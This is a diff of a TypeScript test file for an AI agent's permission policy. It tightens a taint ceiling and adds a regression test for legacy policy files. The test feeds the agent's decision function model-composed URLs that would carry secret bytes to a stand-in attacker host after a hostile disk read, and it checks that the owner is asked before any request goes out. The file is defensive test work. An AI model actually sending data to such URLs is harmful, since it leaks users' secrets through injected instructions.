@@ -5,6 +5,9 @@ import { describe, expect, it } from 'vitest';
 import { runInit } from '../../cli/init.js';
 import { paths } from '../config/config.js';
 import { POLICY_FLOOR, grantedTo, loadPolicyMatrix } from './matrix.js';
+import { createDecide } from './decide.js';
+import { httpCapability } from '../../agent/tools/http.js';
+import type { Principal } from './types.js';
 
 /**
  * `rot/policy.json` was sealed, hashed and read by nobody: the matrix it
@@ -262,14 +265,15 @@ describe('the deny lists are a floor, not a setting', () => {
   });
 });
 
-describe('paramsMaxTaint — the one ceiling the file may also raise (mandato inv. 7)', () => {
+describe('paramsMaxTaint — monotone floor since lane #624 + #641 (HOLD resolution)', () => {
   /**
-   * Deliberately not `it('lets the file tighten a ceiling and refuses to let
-   * it raise one', ...)`'s shape: that test (above) pins `defaultMaxTaint`'s
-   * tighten-only clamp, and `paramsMaxTaint` is NOT under that clamp — see the
-   * field's own doc comment on `PolicyMatrix` (matrix.ts) for why. These three
-   * tests exist so that clamping it later — making it match `defaultMaxTaint`
-   * by accident — goes red instead of silently taking away the owner's dial.
+   * Fino alla HOLD resolution questo numero era l'unico che il file poteva
+   * anche ALZARE, e tre test qui sotto lo provavano. La ragione è caduta con
+   * la misura: una home sigillata col vecchio shipped 2 conservava il
+   * ceiling 2 dopo l'upgrade e con esso il path P0 owner+tier-2. Ora il
+   * clamp è lo stesso `tighter()` di ogni altro ceiling — stringere sì,
+   * riallargare mai — e il test che provava il raise prova il confine.
+   * Riaprire il confine è una decisione/prodotto separata, non un reseal.
    */
   it('defaults to 1 when the file is genuinely silent — tier-2 disk is attacker-influenced, not owner-authored (lane #624 + #641)', () => {
     const dir = home();
@@ -292,10 +296,10 @@ describe('paramsMaxTaint — the one ceiling the file may also raise (mandato in
     rmSync(dir, { recursive: true, force: true });
   });
 
-  it('an owner edit can also RAISE it, unlike defaultMaxTaint', () => {
+  it('a sealed file can no longer RAISE it above the floor — the widening is confined to 1', () => {
     const dir = home();
     writeFileSync(policyOf(dir), JSON.stringify({ schemaVersion: 1, paramsMaxTaint: 3 }));
-    expect(loadPolicyMatrix(dir).paramsMaxTaint).toBe(3);
+    expect(loadPolicyMatrix(dir).paramsMaxTaint).toBe(1);
     rmSync(dir, { recursive: true, force: true });
   });
 
@@ -413,6 +417,72 @@ describe('grant per stanza nel sigillo (ADR-0073)', () => {
     const matrix = loadPolicyMatrix(dir);
     expect(matrix.source).toBe('fallback');
     expect(matrix.note).toContain('denyAbove');
+    rmSync(dir, { recursive: true, force: true });
+  });
+});
+
+/**
+ * Legacy-home regression (lane #624 + #641 repair, HOLD resolution).
+ *
+ * The previous shipped template pinned `"paramsMaxTaint": 2`, and `merge()`
+ * honoured it verbatim (`file.paramsMaxTaint ?? POLICY_FLOOR`) — so an
+ * existing home kept ceiling 2 after upgrade and preserved the P0
+ * owner+tier-2 silent-egress path the lane exists to close. "Sealed
+ * explicit-2 keeps it" was declared as residual and rejected: the sealed file
+ * may tighten below the new floor, never re-widen above it (`tighter()`).
+ */
+describe('legacy home sealed with the previous shipped ceiling', () => {
+  /** The exact previous shipped `defaults/rot/policy.json` (dev@35bde7b1), `_comment` included. */
+  const LEGACY_SHIPPED = {
+    _comment:
+      'Permission matrix, read at boot by core/policy/matrix.ts. Part of the Root of Trust: the agent loop cannot change this at runtime, and your own edits take effect after `muffin rot reseal` and a restart. Since ADR-0053 the taint ceiling comes from each capability\'s EFFECT ROW — where the bytes of the effect land — and the shipped rows are ROW_FLOOR in core/policy/matrix.ts, transcribed from the threat model\'s own matrix. An optional `rows` object here may TIGHTEN a row ({"rows":{"host":{"denyAbove":1}}}) and never widen one; a row name this build does not know is ignored. `defaultMaxTaint` is kept so a home sealed before ADR-0053 still parses, and no longer decides anything. The two deny lists may only grow — removing a shipped entry from them does nothing. `paramsMaxTaint` is the one ceiling here the file may also RAISE, not just lower — it gates model-chosen bytes in a URL\'s query/fragment or a search query, above which the owner is asked and everyone else is refused. Ships 2: tier 2 is your own disk, tier 3 is the outside world (web, search, MCP, forwarded content).',
+    schemaVersion: 1,
+    defaultMaxTaint: { low: 3, medium: 1, high: 1 },
+    paramsMaxTaint: 2,
+    neverAtRuntime: ['rot.write'],
+    forbiddenForSystem: ['outward.send', 'config.ratchet'],
+  };
+
+  const legacyHome = (): string => {
+    const dir = home();
+    writeFileSync(policyOf(dir), JSON.stringify(LEGACY_SHIPPED));
+    return dir;
+  };
+
+  it('a previous-shipped policy.json pinning paramsMaxTaint 2 loads confined to the new floor 1', () => {
+    const dir = legacyHome();
+    const matrix = loadPolicyMatrix(dir);
+    expect(matrix.source).toBe('sealed');
+    expect(matrix.paramsMaxTaint).toBe(1);
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  it('production path on the legacy ceiling: owner-composed path/query at tier 2 asks, never silently allows', () => {
+    const dir = legacyHome();
+    const matrix = loadPolicyMatrix(dir);
+    const decide = createDecide({
+      capabilities: new Map([[httpCapability.id, httpCapability]]),
+      matrix,
+      budgetExhausted: () => false,
+      hardened: true,
+    });
+    const owner: Principal = { kind: 'owner', connector: 'cli', externalId: 'local' };
+    // Owner turn after a hostile tier-2 disk read; the model composed both
+    // URLs (nothing quoted). Either one leaving silently is the P0 path.
+    for (const url of [
+      'https://public-attacker.example/?d=SECRET-BYTES',
+      'https://public-attacker.example/SECRET-BYTES',
+    ]) {
+      const d = decide({
+        principal: owner,
+        tenant: 'host',
+        capability: 'sys.http',
+        resource: { kind: 'url-read', value: url },
+        args: { url },
+        taint: 2,
+      });
+      expect(`${url}: ${d.effect}`).toBe(`${url}: ask`);
+    }
     rmSync(dir, { recursive: true, force: true });
   });
 });
